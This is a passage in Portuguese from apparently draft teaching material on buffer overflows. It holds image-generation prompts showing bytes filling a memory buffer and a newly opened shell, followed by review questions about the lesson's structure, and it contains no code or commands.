em pequenos blocos luminosos de "bytes". Estilo visual tipo efeito de 
compilação/transformação digital, cores em tons de verde e ciano sobre fundo 
escuro, sensação de "matéria bruta sendo extraída".
```

### Imagem 3 — Os bytes entrando no buffer de memória

```
Uma imagem representando pequenos blocos de dados brilhantes (representando 
bytes) sendo "derramados" ou inseridos dentro de um contêiner retangular 
translúcido que representa um espaço de memória, como se fossem líquido ou 
partículas de luz preenchendo um recipiente. Um trecho do contêiner já está 
preenchido com esses blocos, brilhando em vermelho/laranja, indicando que ali 
mora algo diferente do restante. Fundo escuro, estética de visualização de 
dados, sem texto.
```

### Imagem 4 — A execução acontecendo

```
Uma imagem de uma janela de terminal em close-up, com texto verde sobre fundo 
preto, mostrando um prompt de shell recém-aberto, com um pequeno cursor 
piscando, sugerindo controle de linha de comando recém-obtido. Atmosfera de 
"acesso conquistado", levemente dramática mas ainda profissional/técnica, sem 
elementos de hacker estereotipado (sem capuz, sem máscara), só a tela do 
terminal em destaque.
```

---

## Perguntas em aberto antes de avançar

1. A ponte "por que 12 bytes causam tanto estrago" e a tabela de três conexões (o que foi explorado / qual problema foi gerado / qual o tipo de payload) resolveram a lacuna que você sentiu?
2. A ponte de volta ao buffer overflow real da Aula 8 (explicando onde a corrupção de memória de verdade aconteceria) ficou clara?
3. Confirma que os próximos exemplos devem manter esse mesmo padrão de três conexões, sempre?
